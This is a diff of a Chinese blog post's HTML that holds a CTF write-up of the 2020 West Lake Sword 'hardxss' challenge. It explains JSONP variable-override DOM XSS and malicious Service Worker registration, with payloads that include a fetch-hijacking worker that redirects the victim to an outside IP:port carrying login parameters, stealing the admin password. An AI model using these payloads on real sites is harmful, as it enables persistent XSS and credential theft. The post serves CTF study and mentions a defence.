@@ -5,18 +5,18 @@
     
     <title>从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss   从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss  题目初探  JSONP 变量覆盖和DOM XSS  Service Worker  Service Worker简介 注册Service Worker 构造恶意register Service">
+    <meta name="description" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss  从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss 题目初探 JSONP 变量覆盖和DOM XSS   Service Worker Service Worker简介 注册Service Worker 构造恶意register Service Worker有效时间 利用1：XS">
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20201019-sw_safe.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss   从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss  题目初探  JSONP 变量覆盖和DOM XSS  Service Worker  Service Worker简介 注册Service Worker 构造恶意register Service">
+<meta property="og:description" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss  从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss 题目初探 JSONP 变量覆盖和DOM XSS   Service Worker Service Worker简介 注册Service Worker 构造恶意register Service Worker有效时间 利用1：XS">
 <meta property="og:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
 <meta property="og:updated_time" content="2021-10-29T11:39:31.978Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss">
-<meta name="twitter:description" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss   从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss  题目初探  JSONP 变量覆盖和DOM XSS  Service Worker  Service Worker简介 注册Service Worker 构造恶意register Service">
+<meta name="twitter:description" content="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss  从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss 题目初探 JSONP 变量覆盖和DOM XSS   Service Worker Service Worker简介 注册Service Worker 构造恶意register Service Worker有效时间 利用1：XS">
 <meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
     
 
@@ -246,18 +246,15 @@
         <div class="article-entry" itemprop="articleBody">
         
             
-			<h1 id="从一道ctf学习service-worker的利用西湖论剑2020-hardxss">从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss</h1>
-<!-- TOC -->
+			<h1 id="从一道CTF学习Service-Worker的利用：西湖论剑2020-hardxss"><a href="#从一道CTF学习Service-Worker的利用：西湖论剑2020-hardxss" class="headerlink" title="从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss"></a>从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss</h1><!-- TOC -->
 <ul>
-<li><a href="#从一道ctf学习service-worker的利用西湖论剑2020-hardxss">从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss</a>
-<ul>
-<li><a href="#题目初探">题目初探</a>
-<ul>
+<li><a href="#从一道ctf学习service-worker的利用西湖论剑2020-hardxss">从一道CTF学习Service Worker的利用：西湖论剑2020-hardxss</a><ul>
+<li><a href="#题目初探">题目初探</a><ul>
 <li><a href="#jsonp">JSONP</a></li>
 <li><a href="#变量覆盖和dom-xss">变量覆盖和DOM XSS</a></li>
-</ul></li>
-<li><a href="#service-worker">Service Worker</a>
-<ul>
+</ul>
+</li>
+<li><a href="#service-worker">Service Worker</a><ul>
 <li><a href="#service-worker简介">Service Worker简介</a></li>
 <li><a href="#注册service-worker">注册Service Worker</a></li>
 <li><a href="#构造恶意register">构造恶意register</a></li>
@@ -266,19 +263,19 @@
 <li><a href="#利用2跨域xss">利用2：跨域XSS</a></li>
 <li><a href="#service-worker防御措施">Service Worker防御措施</a></li>
 <li><a href="#总结">总结</a></li>
-</ul></li>
+</ul>
+</li>
 <li><a href="#参考资料">参考资料</a></li>
-</ul></li>
+</ul>
+</li>
 </ul>
 <!-- /TOC -->
 <a id="more"></a>
-<h2 id="题目初探">题目初探</h2>
-<ul>
+<h2 id="题目初探"><a href="#题目初探" class="headerlink" title="题目初探"></a>题目初探</h2><ul>
 <li>首先，题目提供了一个在线访问工具，会去访问提交的url。在“联系站长”处有：<code>嘿~想给我报告BUG链接请解开下面的验证码，只能给我发我网站开头的链接给我哟~我收到邮件后会先点开链接然后登录我的网站！</code>，而登陆时，会以GET请求传入用户名和密码：<code>https://auth.hardxss.xhlj.wetolink.com/api/loginVerify?adminname=123&amp;adminpwd=123</code></li>
 <li>所以本题需要<strong>通过XSS拦截并获取登陆时GET请求的密码</strong>，然后以admin身份登录，不能通过常规的盗取cookie实现。这就需要Service Worker来操作。</li>
 </ul>
-<h3 id="jsonp">JSONP</h3>
-<ul>
+<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><ul>
 <li>通过浏览器network工具，可以发现在login处存在一处jsonp： <code>https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=get_user_login_status</code> ，网页直接返回了：</li>
 </ul>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get_user_login_status(&#123;<span class="string">"status"</span>: <span class="literal">false</span>&#125;)</div></pre></td></tr></table></figure>
@@ -287,25 +284,21 @@
 <ul>
 <li>需要注意的是，这个jsonp限制了返回值的长度。</li>
 </ul>
-<h3 id="变量覆盖和dom-xss">变量覆盖和DOM XSS</h3>
-<ul>
+<h3 id="变量覆盖和DOM-XSS"><a href="#变量覆盖和DOM-XSS" class="headerlink" title="变量覆盖和DOM XSS"></a>变量覆盖和DOM XSS</h3><ul>
 <li>仔细查看login处的js代码，可以发现一处dom xss：</li>
 <li>首先，注意到 <code>jsonp</code> 函数会创建 <code>script</code> 标签，并使用 <code>https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=get_user_login_status</code> 处的jsonp，而该jsonp调用的函数由变量 <code>callback</code> 决定。</li>
 <li>在 <code>auto_reg_var</code> 函数中，通过 <code>location.search</code> 获取了请求参数，并通过 <code>window[key] = value</code> 进行了赋值，此处存在变量覆盖漏洞。</li>
 <li>结合以上的jsonp和login页面的js，此处存在DOM型XSS，我们只需要通过GET请求传入login页面callback参数，此时会覆盖掉原来的callback并调用jsonp，payload： <code>?callback=alert(1)//</code> 。</li>
 </ul>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">callback = <span class="string">"get_user_login_status"</span>;</div><div class="line">auto_reg_var();</div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span>(jump_url) == <span class="string">"undefined"</span> || <span class="regexp">/^\//</span>.test(jump_url)) &#123;</div><div class="line">    jump_url = <span class="string">"/"</span>;</div><div class="line">&#125;</div><div class="line">jsonp(<span class="string">"https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback="</span> + callback, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (result[<span class="string">'status'</span>]) &#123;</div><div class="line">        location.href = jump_url;</div><div class="line">    &#125;</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, success</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</div><div class="line">    <span class="keyword">if</span> (url.indexOf(<span class="string">"callback"</span>) &lt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">var</span> funName = <span class="string">'callback_'</span> + <span class="built_in">Date</span>.now() + <span class="built_in">Math</span>.random().toString().substr(<span class="number">2</span>, <span class="number">5</span>);</div><div class="line">        url = url + <span class="string">"?"</span> + <span class="string">"callback="</span> + funName; <span class="comment">//调用jsonp</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">var</span> funName = callback;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">window</span>[funName] = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">        success(data);</div><div class="line">        <span class="keyword">delete</span> <span class="built_in">window</span>[funName];</div><div class="line">        <span class="built_in">document</span>.body.removeChild(script);</div><div class="line">    &#125;</div><div class="line">    script.src = url;</div><div class="line">    <span class="built_in">document</span>.body.appendChild(script); <span class="comment">//执行jsonp的返回函数</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">auto_reg_var</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> search = location.search.slice(<span class="number">1</span>);</div><div class="line">    <span class="keyword">var</span> search_arr = search.split(<span class="string">'&amp;'</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; search_arr.length; i++) &#123;</div><div class="line">        [key, value] = search_arr[i].split(<span class="string">"="</span>);</div><div class="line">        <span class="built_in">window</span>[key] = value; <span class="comment">//此处存在变量覆盖，可以覆盖掉callback变量</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>虽然找到了一处XSS，但是题目又说明：“我收到邮件后会先点开链接然后登录我的网站！”，而登录的域名是<code>auth.hardxss.xhlj.wetolink.com</code>，<strong>登录和打开链接是在不同的域名</strong>，并且需要盗取的信息在请求中而不是在cookie中。又注意到，直接访问<code>https://auth.hardxss.xhlj.wetolink.com/</code>，返回的页面源码的js中包含跨域操作：<code>document.domain = &quot;hardxss.xhlj.wetolink.com&quot;;</code>， 所以此题需要使XSS跨域持久化，这就涉及到本文的主角：Service Worker，通过它和<strong>其他页面的跨域操作</strong>可以让XSS持久化。此外，由于<strong>需要拦截登陆时的参数</strong>，其他方法难以做到拦截请求，而SW可以。</p>
-<h2 id="service-worker">Service Worker</h2>
-<h3 id="service-worker简介">Service Worker简介</h3>
-<ul>
+<p>虽然找到了一处XSS，但是题目又说明：“我收到邮件后会先点开链接然后登录我的网站！”，而登录的域名是<code>auth.hardxss.xhlj.wetolink.com</code>，<strong>登录和打开链接是在不同的域名</strong>，并且需要盗取的信息在请求中而不是在cookie中。又注意到，直接访问<code>https://auth.hardxss.xhlj.wetolink.com/</code>，返回的页面源码的js中包含跨域操作：<code>document.domain = &quot;hardxss.xhlj.wetolink.com&quot;;</code>，<br>所以此题需要使XSS跨域持久化，这就涉及到本文的主角：Service Worker，通过它和<strong>其他页面的跨域操作</strong>可以让XSS持久化。此外，由于<strong>需要拦截登陆时的参数</strong>，其他方法难以做到拦截请求，而SW可以。</p>
+<h2 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h2><h3 id="Service-Worker简介"><a href="#Service-Worker简介" class="headerlink" title="Service Worker简介"></a>Service Worker简介</h3><ul>
 <li>Appcache用来处理网站的离线缓存，可以通过manifest文件指定浏览器缓存哪些文件以供离线访问。但Appcache有相当多的缺陷，对于整站中的多页缓存来说支持比较差，而Service Worker用来作为其替代。</li>
 <li>Service Worker是浏览器在后台运行的脚本，与web页面分离，以更好地支持不需要web页面或用户交互的功能。也可以将其理解为一个介于客户端和服务端之间的代理服务器，拥有<strong>拦截请求、修改返回内容</strong>的权力。可以用来缓存并处理离线网页（用来XSS）。</li>
 <li>Service Workers 要求<strong>必须在 HTTPS 下才能运行</strong>。为了便于本地开发，<strong>localhost</strong> 也被浏览器认为是安全源。</li>
 <li>Service Workers<strong>没有访问 DOM 的能力</strong>。</li>
 </ul>
-<h3 id="注册service-worker">注册Service Worker</h3>
-<p>要使用SW，需要先注册，有两种方法注册SW：1. 通过JS；2. 通过link标签引入外部js</p>
+<h3 id="注册Service-Worker"><a href="#注册Service-Worker" class="headerlink" title="注册Service Worker"></a>注册Service Worker</h3><p>要使用SW，需要先注册，有两种方法注册SW：1. 通过JS；2. 通过link标签引入外部js  </p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</div><div class="line">    navigator.serviceWorker.register(<span class="string">'/sw-test/sw.js'</span>, &#123;</div><div class="line">        scope: <span class="string">'/sw-test/'</span></div><div class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">reg</span>) </span>&#123;</div><div class="line">        <span class="comment">// registration worked</span></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Registration succeeded. Scope is '</span> + reg.scope);</div><div class="line">    &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</div><div class="line">        <span class="comment">// registration failed</span></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Registration failed with '</span> + error);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"serviceworker"</span> <span class="attr">href</span>=<span class="string">"/sw.js"</span>&gt;</span></div></pre></td></tr></table></figure>
 <ul>
@@ -314,28 +307,24 @@
 <li>第二个参数 <code>scope</code> 则限定了Service Worker访问的资源的名称空间（如本例中只能访问 <code>/sw-test/</code> 的子路径），并且， <code>scope</code> 参数不能设置为第一个参数的上层路径（ <code>scope</code> 范围必须要小于 <code>Service Worker</code> 脚本本身的路径范围），几个例子：</li>
 </ul>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">无效：<span class="string">"/assets/js/sw.js"</span>,&#123;<span class="attr">scope</span>: <span class="string">"https://other.example.com/"</span>&#125;</div><div class="line">无效：<span class="string">"/assets/js/sw.js"</span>, &#123;<span class="attr">scope</span>: <span class="string">"/assets/"</span>&#125;</div><div class="line">无效：<span class="string">"/assets/js/sw.js"</span>, &#123;<span class="attr">scope</span>: <span class="string">"/assets/css/"</span>&#125;</div><div class="line">有效：<span class="string">"/assets/js/sw.js"</span>, &#123;<span class="attr">scope</span>: <span class="string">"/assets/js/"</span>&#125;</div><div class="line">有效：<span class="string">"/assets/js/sw.js"</span>, &#123;<span class="attr">scope</span>: <span class="string">"/assets/js/sub/"</span>&#125;</div></pre></td></tr></table></figure>
-<h3 id="构造恶意register">构造恶意register</h3>
-<p>从上文可以看出，Service Worker有诸多限制，所以利用起来也比较局限。 一种利用方式：首先发现本站的jsonp（或者有本站的js文件上传点，但这种情况比较少），以作为sw脚本url源。 接一段lightless师傅的引用：</p>
+<h3 id="构造恶意register"><a href="#构造恶意register" class="headerlink" title="构造恶意register"></a>构造恶意register</h3><p>从上文可以看出，Service Worker有诸多限制，所以利用起来也比较局限。<br>一种利用方式：首先发现本站的jsonp（或者有本站的js文件上传点，但这种情况比较少），以作为sw脚本url源。<br>接一段lightless师傅的引用：</p>
 <blockquote>
 <p>该接口的路径越浅越好，最好在根目录下。很明显 <code>http://localhost/time.jsonp?callback=</code> 要优于 <code>http://localhost/a/b/c/time.jsonp?callback=</code> ，因为如果后者作为 <code>Service Worker</code> 的脚本时， <code>scope</code> 只能为 <code>/a/b/c/</code> 下的路径，而前者可以控制整个域下的内容。</p>
 </blockquote>
-<p>有了这个JSONP，使用 <code>importScripts</code> 就可以在SW注册时引入任意<strong>https</strong>脚本： <code>importScripts('https://my_site.com/my_evil.js');</code></p>
+<p>有了这个JSONP，使用 <code>importScripts</code> 就可以在SW注册时引入任意<strong>https</strong>脚本： <code>importScripts(&#39;https://my_site.com/my_evil.js&#39;);</code></p>
 <p>利用脚本：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//SW脚本</span></div><div class="line"><span class="keyword">this</span>.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> url = event.request.clone(); <span class="comment">//获得用户请求</span></div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'url: '</span>, url);</div><div class="line">    <span class="keyword">var</span> body = <span class="string">'&lt;script&gt;alert("test")&lt;/script&gt;'</span>;</div><div class="line">    <span class="keyword">var</span> init = &#123;</div><div class="line">        headers: &#123;</div><div class="line">            <span class="string">"Content-Type"</span>: <span class="string">"text/html"</span></div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">if</span> (url.url === <span class="string">'http://localhost/sw/target.html'</span>) &#123;<span class="comment">//要访问的url（https或localhost）</span></div><div class="line">        <span class="keyword">var</span> res = <span class="keyword">new</span> Response(body, init);</div><div class="line">        event.respondWith(res.clone()); <span class="comment">//篡改返回结果</span></div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
 <p>原理：通过监听 <code>fetch</code> 事件，截获用户的请求，篡改返回，向返回的页面上嵌入恶意的JS脚本。</p>
-<h3 id="service-worker有效时间">Service Worker有效时间</h3>
-<p>在每个Service Worker授权<strong>24小时</strong>后（用PC时钟确定时间），原先的HTTP缓存将被清除。脚本需要被重新注册以正常使用，否则会被摧毁。</p>
-<h3 id="利用1xss持久化拓展xss攻击面">利用1：XSS持久化、拓展XSS攻击面</h3>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">importScripts(<span class="string">'https://my_site.com/sw.js'</span>);<span class="comment">//用于注册恶意脚本，通过jsonp或js上传调用importScripts从而引入外部JS</span></div></pre></td></tr></table></figure>
+<h3 id="Service-Worker有效时间"><a href="#Service-Worker有效时间" class="headerlink" title="Service Worker有效时间"></a>Service Worker有效时间</h3><p>在每个Service Worker授权<strong>24小时</strong>后（用PC时钟确定时间），原先的HTTP缓存将被清除。脚本需要被重新注册以正常使用，否则会被摧毁。</p>
+<h3 id="利用1：XSS持久化、拓展XSS攻击面"><a href="#利用1：XSS持久化、拓展XSS攻击面" class="headerlink" title="利用1：XSS持久化、拓展XSS攻击面"></a>利用1：XSS持久化、拓展XSS攻击面</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">importScripts(<span class="string">'https://my_site.com/sw.js'</span>);<span class="comment">//用于注册恶意脚本，通过jsonp或js上传调用importScripts从而引入外部JS</span></div></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// sw.js（SW恶意脚本）</span></div><div class="line">onfetch=<span class="function"><span class="params">e</span>=&gt;</span>&#123;<span class="comment">//劫持fetch事件，即浏览器在子域下的每一次访问都会触发</span></div><div class="line">    body =</div><div class="line">    <span class="string">'&lt;script&gt;alert(document.domain)&lt;/script&gt;'</span>;</div><div class="line">    init =&#123;<span class="attr">headers</span>:&#123;<span class="string">'content-type'</span>:<span class="string">'text/html'</span>&#125;&#125;;</div><div class="line">    e.respondWith(<span class="keyword">new</span> Response(body,init));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// sw.js；与上一个类似</span></div><div class="line"><span class="keyword">this</span>.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> url = event.request.clone();</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'url: '</span>, url);</div><div class="line">    <span class="keyword">var</span> body = <span class="string">'&lt;script&gt;alert("test")&lt;/script&gt;'</span>;</div><div class="line">    <span class="keyword">var</span> init = &#123;<span class="attr">headers</span>: &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;&#125;;</div><div class="line">    <span class="keyword">if</span> (url.url === <span class="string">'http://localhost/sw/target.html'</span>) &#123;</div><div class="line">        <span class="keyword">var</span> res = <span class="keyword">new</span> Response(body, init);</div><div class="line">        event.respondWith(res.clone());</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<h3 id="利用2跨域xss">利用2：跨域XSS</h3>
-<ul>
+<h3 id="利用2：跨域XSS"><a href="#利用2：跨域XSS" class="headerlink" title="利用2：跨域XSS"></a>利用2：跨域XSS</h3><ul>
 <li>这便是本题的利用思路了，首先看条件：若<strong>另一个页面</strong>存在跨域操作（如：<code>document.domain=&quot;xxx.xxx&quot;</code>），则可以跨该域进行XSS。</li>
 </ul>
 <p>再引用一段lightless师傅的博客：</p>
 <blockquote>
-<p>假设我们在 <code>A.lightless.me</code> 上发现了 XSS，想要横向移动到 <code>secret.lightless.me</code> 上。当 <code>secret.lightless.me</code> 上存在跨域行为的时候，例如 <code>document.domain = 'lightless.me'</code> ，我们可以通过 XSS 漏洞嵌入一个 <code>iframe</code> 标签，以此给 <code>secret.lightless.me</code> 域下植入 <code>Service Worker</code> （前提是 <code>secret.lightless.me</code> 域下存在一个 <code>JSONP</code> 或是有可以返回 <code>Service Worker</code> 脚本的地方）。通过这种方法，即便 <code>secret.lightless.me</code> 域内没有 XSS，也可以被植入恶意的 <code>Service Worker</code> 。</p>
+<p>假设我们在 <code>A.lightless.me</code> 上发现了 XSS，想要横向移动到 <code>secret.lightless.me</code> 上。当 <code>secret.lightless.me</code> 上存在跨域行为的时候，例如 <code>document.domain = &#39;lightless.me&#39;</code> ，我们可以通过 XSS 漏洞嵌入一个 <code>iframe</code> 标签，以此给 <code>secret.lightless.me</code> 域下植入 <code>Service Worker</code> （前提是 <code>secret.lightless.me</code> 域下存在一个 <code>JSONP</code> 或是有可以返回 <code>Service Worker</code> 脚本的地方）。通过这种方法，即便 <code>secret.lightless.me</code> 域内没有 XSS，也可以被植入恶意的 <code>Service Worker</code> 。</p>
 </blockquote>
 <p>理解一下：我们在<code>A.lightless.me</code>上插入一个<code>secret.lightless.me</code>域（<code>secret.lightless.me</code>域下存在跨域行为和JSONP或js文件上传）下的<code>iframe</code>，并通过JSONP为该<code>iframe</code>注册恶意SW，由于该页面跨域了，所以<code>A.lightless.me</code>页面的iframe可以访问其内容，能够成功为<code>secret.lightless.me</code>注册恶意SW。</p>
 <p>在本题中，首先诱导受害者访问：</p>
@@ -346,37 +335,33 @@
 <figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//2.js（SW脚本，必须通过JSONP或JS上传引入）</span></div><div class="line"></div><div class="line"><span class="keyword">this</span>.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> body = <span class="string">"&lt;script&gt;location='http://159.75.52.53:8888/'+location.search;&lt;/script&gt;"</span>;<span class="comment">//通过GET请求传参，此处劫持请求并将其带出</span></div><div class="line">    <span class="keyword">var</span> init = &#123;<span class="attr">headers</span>: &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;&#125;;</div><div class="line">    <span class="keyword">var</span> res = <span class="keyword">new</span> Response(body, init);</div><div class="line">    event.respondWith(res.clone());</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
 <p><code>2.js</code>是SW脚本，在<code>2.js</code>中，我们劫持了<code>fetch</code>事件，并将请求传给我们的服务器，从而在管理员登陆时劫持并窃取管理员密码，达到利用目的。拿到密码后，登录网页即可拿到flag。需要注意的一点是，由于JSONP为<code>https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=xxx</code>，我们只能劫持受害者在<code>https://auth.hardxss.xhlj.wetolink.com/api/</code>的子域下的请求；而用户登陆的url为<code>https://auth.hardxss.xhlj.wetolink.com/api/loginVerify?adminname=xxx&amp;adminpwd=xxx</code>，恰好在该子域下，所以利用才能成功。可以看出SW的可利用路径是非常苛刻的。</p>
 <p>真实情况下的案例：<a href="https://120.25.156.28/posts/1.html" target="_blank" rel="external">百度漏洞报告：埋雷式攻击，悄无声息获取用户百度登录密码</a></p>
-<h3 id="service-worker防御措施">Service Worker防御措施</h3>
-<p>当注册SW时，会发出包含 <code>Service-Worker: script</code> http头的请求，可以在服务端拒绝非<code>SW Script</code>却又包含该头的请求以进行防范。</p>
-<h3 id="总结">总结</h3>
-<ul>
+<h3 id="Service-Worker防御措施"><a href="#Service-Worker防御措施" class="headerlink" title="Service Worker防御措施"></a>Service Worker防御措施</h3><p>当注册SW时，会发出包含 <code>Service-Worker: script</code> http头的请求，可以在服务端拒绝非<code>SW Script</code>却又包含该头的请求以进行防范。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
 <li>让我们梳理一下，考虑一些细节，整道题主要涉及到四个url：</li>
 </ul>
-<ol type="1">
-<li>DOM XSS（https://xss.hardxss.xhlj.wetolink.com/login）</li>
-<li>JSONP（https://auth.hardxss.xhlj.wetolink.com/api/loginStatus）</li>
-<li>跨域页面（https://auth.hardxss.xhlj.wetolink.com）</li>
-<li>登录验证api（https://auth.hardxss.xhlj.wetolink.com/api/loginVerify）</li>
+<ol>
+<li>DOM XSS（<a href="https://xss.hardxss.xhlj.wetolink.com/login）" target="_blank" rel="external">https://xss.hardxss.xhlj.wetolink.com/login）</a> </li>
+<li>JSONP（<a href="https://auth.hardxss.xhlj.wetolink.com/api/loginStatus）" target="_blank" rel="external">https://auth.hardxss.xhlj.wetolink.com/api/loginStatus）</a></li>
+<li>跨域页面（<a href="https://auth.hardxss.xhlj.wetolink.com）" target="_blank" rel="external">https://auth.hardxss.xhlj.wetolink.com）</a></li>
+<li>登录验证api（<a href="https://auth.hardxss.xhlj.wetolink.com/api/loginVerify）" target="_blank" rel="external">https://auth.hardxss.xhlj.wetolink.com/api/loginVerify）</a></li>
 </ol>
-<p>最后结合一张networking截图理解：<br>
-<img src="http://159.75.52.53/img/blogimg/xihulunjian_hardxss/networking.png" alt="networking"></p>
+<p>最后结合一张networking截图理解：<br><img src="http://159.75.52.53/img/blogimg/xihulunjian_hardxss/networking.png" alt="networking"></p>
 <ul>
 <li>注意到跨域页面上只有一个光秃秃的跨域操作，并没有其他操作，但作为媒介用以设置其子域-登录验证api上的SW脚本（设置脚本时访问的是跨域页面而没有访问劫持页面）</li>
-<li>利用条件：<code>1.baidu.com</code>上发现了XSS，<code>2.baidu.com</code>上存在跨域操作：<code>document.domain = 'baidu.com'</code>并且子域下存在JSONP（路径需要跟盗取的信息页面在同一子域）或能够上传js的地方，就可以完成JSONP子域下的持久化XSS劫持。</li>
+<li>利用条件：<code>1.baidu.com</code>上发现了XSS，<code>2.baidu.com</code>上存在跨域操作：<code>document.domain = &#39;baidu.com&#39;</code>并且子域下存在JSONP（路径需要跟盗取的信息页面在同一子域）或能够上传js的地方，就可以完成JSONP子域下的持久化XSS劫持。</li>
 </ul>
 <p>最后几点：</p>
-<ol type="1">
+<ol>
 <li>JSONP决定了可以盗取的页面子域</li>
 <li>可以用来劫持请求，并直接盗取请求参数，这是其他XSS不能办到的</li>
 <li>持久化XSS</li>
 <li>扩大XSS到SW脚本子域</li>
 </ol>
-<h2 id="参考资料">参考资料</h2>
-<ul>
-<li><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="external">XSS With Service Worker</a></li>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="external">XSS With Service Worker </a></li>
 <li><a href="https://lorexxar.cn/2018/04/20/SW-xss/" target="_blank" rel="external">基于Service Worker 的XSS攻击面拓展</a></li>
 <li><a href="https://zhuanlan.zhihu.com/p/29734820" target="_blank" rel="external">如何利用/防御 Service Worker</a></li>
